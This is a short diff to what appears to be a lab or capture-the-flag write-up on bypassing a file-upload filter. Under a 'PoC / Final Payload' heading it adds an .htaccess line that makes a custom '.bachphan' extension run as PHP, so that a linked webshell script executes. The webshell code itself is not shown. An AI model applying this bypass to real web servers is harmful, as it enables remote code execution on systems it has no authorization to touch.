@@ -37,6 +37,10 @@ First, I tried to upload the [[Webshell script]] directly and this is the result
 
 ## ⚡ 4. PoC / Final Payload
 
+Configuration file: 
+ ```htaccess
+ AddType application/x-httpd-php .bachphan
+ ```
 Script name: `script.bachphan`
 [[Webshell script]]
 ---
